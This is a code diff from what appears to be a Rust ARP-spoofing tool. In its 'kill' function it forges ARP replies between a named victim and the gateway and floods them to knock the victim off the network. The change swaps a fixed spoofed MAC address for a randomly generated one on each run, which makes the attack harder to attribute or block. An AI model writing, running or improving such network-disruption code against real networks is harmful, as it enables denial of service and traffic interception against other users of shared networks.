@@ -1,4 +1,3 @@
-use std::borrow::Borrow;
 use std::collections::HashMap;
 use std::net::{IpAddr, Ipv4Addr};
 use std::sync::atomic::{AtomicBool, Ordering};
@@ -12,6 +11,7 @@ use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, ArpPacket, MutableArpPa
 use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
 use pnet::packet::{MutablePacket, Packet};
 use pnet_datalink::{DataLinkReceiver, DataLinkSender, MacAddr, NetworkInterface};
+use rand::Rng;
 use std::io::ErrorKind::TimedOut;
 
 use crate::{LoveThreads, State, VENDORS};
@@ -64,7 +64,8 @@ pub fn kill(
     println!("victim's MAC {}", client.mac);
     println!("gateway's IP {}", gateway.ipv4);
     println!("gateway's MAC {}", gateway.mac);
-    let source_mac: MacAddr = "ba:3b:bb:20:18:9a".parse().unwrap();
+    let source_mac: MacAddr = generate_random_mac_addr();
+    println!("Generated random mac addr: {}", source_mac);
     let packets = vec![
         create_kill_packet(gateway.ipv4, client.ipv4, source_mac, client.mac),
         create_kill_packet(client.ipv4, gateway.ipv4, source_mac, gateway.mac),
@@ -77,6 +78,14 @@ pub fn kill(
         },
     );
     spam_arp_replies(timed_out, packets, interface, delay);
+}
+
+fn generate_random_mac_addr() -> MacAddr {
+    let mut rng = rand::thread_rng();
+    let mac_bytes: Vec<u8> = (0..6).map(|_| rng.gen::<u8>()).collect();
+
+    return MacAddr(mac_bytes[0], mac_bytes[1],
+        mac_bytes[2], mac_bytes[3], mac_bytes[4], mac_bytes[5]);
 }
 
 pub fn spam_arp_replies(
